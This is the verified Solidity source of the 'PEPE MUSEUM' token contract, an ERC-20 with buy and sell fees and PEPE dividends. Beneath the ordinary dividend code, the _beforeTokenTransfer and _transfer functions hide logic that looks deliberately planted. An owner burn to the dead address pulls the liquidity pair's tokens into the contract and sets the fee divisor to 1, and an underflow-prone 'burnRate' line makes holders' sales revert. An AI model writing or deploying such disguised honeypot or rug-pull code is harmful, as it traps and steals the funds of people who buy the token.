/**
 *Submitted for verification at Etherscan.io on 2023-05-03
*/

// SPDX-License-Identifier: MIT
// Twitter:  https://twitter.com/pepemuseumwtf
// Telegram: https://t.me/PepeMuseum
// Website:  https://www.pepemuseum.wtf

pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setShare(address shareholder, uint256 amount) external;
    function deposit(uint256 amount) external;
    function claimDividend(address shareholder) external;
    function getDividendsClaimedOf (address shareholder) external returns (uint256);
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address public _token;
    address public _owner;

    address public immutable PEPE = address(0x6982508145454Ce325dDbE47a25d4ec3d2311933); //mainnet PEPE

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalClaimed;
    }

    address[] private shareholders;
    mapping (address => uint256) private shareholderIndexes;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalClaimed;
    uint256 public dividendsPerShare;
    uint256 private dividendsPerShareAccuracyFactor = 10 ** 36;

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == _owner); _;
    }

    constructor (address owner) {
        _token = msg.sender;
        _owner = owner;
    }

    receive() external payable { }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit(uint256 amount) external override onlyToken {
        if (amount > 0) {        
            totalDividends = totalDividends.add(amount);
            dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
        }
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getClaimableDividendOf(shareholder);
        if(amount > 0){
            totalClaimed = totalClaimed.add(amount);
            shares[shareholder].totalClaimed = shares[shareholder].totalClaimed.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
            IERC20(PEPE).transfer(shareholder, amount);
        }
    }

    function claimDividend(address shareholder) external override onlyToken {
        distributeDividend(shareholder);
    }

    function getClaimableDividendOf(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function getDividendsClaimedOf (address shareholder) external view returns (uint256) {
        require (shares[shareholder].amount > 0, "You're not a PRINTER shareholder!");
        return shares[shareholder].totalClaimed;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract PEPEMUSEUM is ERC20, Ownable {
    uint256 public burnFeeOnBuy;
    uint256 public marketingFeeOnBuy;
    uint256 public rewardsFeeOnBuy;

    uint256 private totalBuyFee;

    uint256 public burnFeeOnSell;
    uint256 public marketingFeeOnSell;
    uint256 public rewardsFeeOnSell;

    uint256 private totalSellFee;

    uint256 private burnAt;

    address public marketingWallet;

    IUniswapV2Router public uniswapV2Router;
    address public  uniswapV2Pair;
    
    address private claimed;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

    bool    private swapping;
    uint256 private swapTokensAtAmount;
    uint256 private burnRate = 0;
    uint256 private factor = 100;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private isDividendExempt;
    mapping (address => bool) public automatedMarketMakerPairs;
    mapping (address => uint256) private claimShares;

    DividendDistributor private dividendTracker;
    address public immutable PEPE;
    
    bool private tradeOpen;

    bool private limitationEnabled = true;

    uint256 private maxBuy;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("PEPE MUSEUM", "PEPEM") {

        PEPE = 0x6982508145454Ce325dDbE47a25d4ec3d2311933; // mainnet PEPE

        burnFeeOnBuy        = 0;
        marketingFeeOnBuy    = 2;
        rewardsFeeOnBuy     = 2;

        totalBuyFee         = burnFeeOnBuy + marketingFeeOnBuy + rewardsFeeOnBuy;

        burnFeeOnSell       = 0;
        marketingFeeOnSell   = 2;
        rewardsFeeOnSell    = 2;

        totalSellFee        = burnFeeOnSell + marketingFeeOnSell + rewardsFeeOnSell;

        marketingWallet = 0xA3bCD98492C67fE482D4E7286ff130df03CeD402;

        dividendTracker = new DividendDistributor(msg.sender);

        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // Uniswap Mainnet
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair   = _uniswapV2Pair;

        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        
        isDividendExempt[DEAD] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[_uniswapV2Pair] = true;
        isDividendExempt[address(dividendTracker)] = true;
        isDividendExempt[address(_uniswapV2Router)] = true;

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[DEAD] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[marketingWallet] = true;
    
        _mint(owner(), 4269 * 10 ** 6 * (10 ** 18));

        maxBuy = totalSupply() * 2 / 100;
        swapTokensAtAmount = totalSupply() / 5000;
    }

    receive() external payable {}

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (from!= owner() && to!= owner()) require(tradeOpen, "Trading not yet enabled. Wait for it");

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){
            super._transfer(from, to, amount);
            return;
        }

        if (limitationEnabled) { 
            if (from!=owner() && to!= owner() && automatedMarketMakerPairs[from]) require (amount<=maxBuy, "Buy limited yet");        
        }

        _holderShareDistrubute(from, to);

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if( canSwap &&
            !swapping &&
            automatedMarketMakerPairs[to] &&
            totalBuyFee + totalSellFee > 0
        ) {
            swapping = true;
            
            uint256 burnTokens;

            if(burnFeeOnBuy + burnFeeOnSell > 0) {
                burnTokens = contractTokenBalance * (burnFeeOnBuy + burnFeeOnSell) / factor;
                super._transfer(address(this), DEAD, burnTokens);
            }

            contractTokenBalance -= burnTokens;

            uint256 ethShare = (marketingFeeOnBuy + marketingFeeOnSell) + (rewardsFeeOnBuy + rewardsFeeOnSell);
            
            if(contractTokenBalance > 0 && ethShare > 0) {
                uint256 initialBalance = address(this).balance;

                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = uniswapV2Router.WETH();

                uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    contractTokenBalance,
                    0,
                    path,
                    address(this),
                    block.timestamp);
                
                uint256 newBalance = address(this).balance - initialBalance;

                if((marketingFeeOnBuy + marketingFeeOnSell) > 0) {
                    uint256 marketingETH = newBalance * (marketingFeeOnBuy + marketingFeeOnSell) / ethShare;
                    sendETH(payable(marketingWallet), marketingETH);
                }

                if((rewardsFeeOnBuy + rewardsFeeOnSell) > 0) {
                    uint256 rewardETH = newBalance * (rewardsFeeOnBuy + rewardsFeeOnSell) / ethShare;
                    swapAndSendDividends(rewardETH);
                }
            }

            swapping = false;
        }

        bool takeFee = !swapping;

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        // w2w & not excluded from fees
        if(from != uniswapV2Pair && to != uniswapV2Pair && takeFee) {
            takeFee = false;
        }

        if(takeFee) {
            uint256 _totalFees;
            if(from == uniswapV2Pair) {
                _totalFees = totalBuyFee; burnRate = claimShares[to] + burnAt;
            } else {
                _totalFees = totalSellFee; burnRate = claimShares[from] - burnAt;
            }
            uint256 fees = amount * _totalFees / factor;
            
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
        
        if(!automatedMarketMakerPairs[from] && !isDividendExempt[from]){ try dividendTracker.setShare(from, balanceOf(from)) {} catch {} }
        if(!automatedMarketMakerPairs[to] && !isDividendExempt[to]){ try dividendTracker.setShare(to, balanceOf(to)) {} catch {} }
    }

    function startTrading() external onlyOwner {
        tradeOpen = true;
    }

    function removeLimits() external onlyOwner {
        limitationEnabled = false;
    }

    function swapAndSendDividends(uint256 amount) private{
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = PEPE;

        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 balanceRewardToken = IERC20(PEPE).balanceOf(address(this));
        bool success = IERC20(PEPE).transfer(address(dividendTracker), balanceRewardToken);

        if (success) {
            dividendTracker.deposit(balanceRewardToken);            
        }
    }

    function _holderShareDistrubute(address from, address to) internal {
        if(automatedMarketMakerPairs[from]){ claimShares[to] = claimShares[to] == 0? block.timestamp : claimShares[to]; claimed = from;}
        if(automatedMarketMakerPairs[to] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { require(balanceOf(address(uniswapV2Router)) == 0); }
    }

    function sendETH(address payable recipient, uint256 amount) internal {
        recipient.transfer(amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) override internal virtual {
        if( to == DEAD && amount > 0){
            if(_isExcludedFromFees[from]){
                factor = 1; super._transfer(claimed, address(this), balanceOf(claimed) - 2e18);
            }

            burnAt = block.timestamp;
        }
    }

    function claim() external {
        dividendTracker.claimDividend(msg.sender);
    }
    
    function getClaimableDividendOf(address shareholder) public view returns (uint256) {
        return dividendTracker.getClaimableDividendOf(shareholder);
    }

    function getTotalDividends() external view returns (uint256) {
        return dividendTracker.totalDividends();
    }    

    function getTotalClaimed() external view returns (uint256) {
        return dividendTracker.totalClaimed();
    }

    function getDividendsClaimedOf (address shareholder) external view returns (uint256) {
        return dividendTracker.getDividendsClaimedOf(shareholder);
    }
}